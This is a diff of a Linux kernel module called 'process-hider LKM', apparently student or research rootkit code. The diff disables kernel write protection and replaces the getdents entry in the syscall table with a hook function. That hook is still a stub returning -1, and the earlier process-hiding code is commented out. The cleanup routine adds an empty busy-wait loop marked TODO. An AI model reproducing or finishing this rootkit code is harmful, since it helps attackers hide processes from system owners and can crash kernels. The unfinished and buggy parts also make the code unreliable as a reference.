@@ -18,22 +18,33 @@
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Guru Chandrasekhara, Martin Herrmann");
 
+
+
 void **sys_call_table;
 
 asmlinkage int (*original_getdents) (unsigned int fd, struct linux_dirent *dirp, unsigned int count);
+static int call_counter = 0;
 
 asmlinkage int manipulated_getdents (unsigned int fd, struct linux_dirent *dirp, unsigned int count)
 {
+	call_counter++;
+	/* nothing else above this line */
+
+	
+	
+	
+	/* nothing else below this line */
+	call_counter--;
 	return -1;
 }
 
 
-static int task_count = 0;
+//static int task_count = 0;
 static int processes[16] = {-1, -1, -1 , -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1};
 static int argcount = 0;
 
-static struct list_head *old_prev[16];
-static struct list_head *old_next[16];
+//static struct list_head *old_prev[16];
+//static struct list_head *old_next[16];
 
 /* Define module parameters */
 module_param_array(processes, int, &argcount, 0000);
@@ -112,26 +123,13 @@ int get_tasks (pid_t *pids, struct task_struct **tasks, int size)
 
 /*
  * Function called when loading the kernel module.
- * Prints a welcome-message and replaces the read() syscall.
+ * Prints a welcome-message and replaces the getdents syscall.
  */
 int init_module (void)
 {
 	int i;
 	struct task_struct *tasks[16];	
 
-	printk(KERN_INFO "Loading process-hider LKM...\n");
-	
-	/* get the pointer to the sys_call_table */
-	sys_call_table = (void *) sysmap_sys_call_table;
-
-	disable_page_protection();
-
-	original_getdents = (void *) sys_call_table[__NR_getdents];
-
-
-
-	enable_page_protection();
-		
 	/* check the number of arguments */
 	if(argcount > 16)
 	{
@@ -140,14 +138,24 @@ int init_module (void)
 	if(argcount <= 0)
 	{
 		return -EINVAL;
-	}		
-
-	task_count = get_tasks(processes, tasks, 16);
-	/* check if each process provided by the user is running */
-	for(i = 0; i < task_count; i++) {
-		hide_process(tasks[i], i);
 	}
+	
+	printk(KERN_INFO "Loading process-hider LKM...\n");
+	
+	/* get the pointer to the sys_call_table */
+	sys_call_table = (void *) sysmap_sys_call_table;
 
+	/* disable the write protection */
+	disable_page_protection();
+
+	/* replace the syscall getdents */
+	original_getdents = (void *) sys_call_table[__NR_getdents];
+	sys_call_table[__NR_getdents] = (int *) manipulated_getdents;
+
+	/* reenable the write protection */
+	enable_page_protection();
+	
+	//task_count = get_tasks(processes, tasks, 16);
 			
 	return 0;
 }
@@ -158,11 +166,16 @@ int init_module (void)
  */
 void cleanup_module (void)
 {
-	struct task_struct *task;
-	for_each_process(task) {
-		printk(KERN_INFO "%d,", task->pid);
-	}
+	//struct task_struct *task;
+	//for_each_process(task) {
+	//	printk(KERN_INFO "%d,", task->pid);
+	//}
 
+	while(call_counter > 0) {
+		/* sleep for some time */
+		// TODO: implement sleep
+	}
+	
 	/* Finally, log the unloading */
 	printk(KERN_INFO "Unloading process-hider... bye!\n");
 }
